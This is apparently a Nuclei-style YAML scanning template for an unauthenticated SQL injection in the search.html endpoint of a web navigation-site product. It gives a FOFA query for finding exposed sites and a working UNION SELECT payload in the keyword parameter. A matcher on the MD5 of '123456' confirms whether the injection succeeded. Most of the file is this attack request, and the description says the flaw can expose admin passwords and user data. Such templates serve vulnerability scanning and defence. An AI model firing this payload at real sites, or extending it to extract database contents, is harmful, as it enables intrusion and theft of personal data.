id: lanren-search_html-sql

info:
  name: "懒人网址导航页 search.html 接口 SQL 注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="./templates/antidote/css/style.css"
      懒人网址导航页 search.htm 接口存在未授权SQL注入风险。攻击者可通过构造恶意SQL查询，绕过身份验证机制，非法访问数据库内容（如管理员后台密码、用户个人信息），并在具备高权限的情况下向服务器写入命令，从而获取系统权限。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247483925&idx=1&sn=0569b6033495591bde3ccc171b4286d5&chksm=c267b726f5103e30436bb7b44746121e201283ecb21bd6bf50f446e6a15c34141631533f79b9&token=377357801&lang=zh_CN&poc_token=HKoAFWejeWzt3bftNwOMxYcB5ymjEkP5AdL6cHCU
  tags: 懒人网址导航页

http:
- raw:
  - |
    GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,md5(123456),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36


  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'e10adc3949ba59abbe56e057f20f883e'
  - type: status
    status:
    - 200





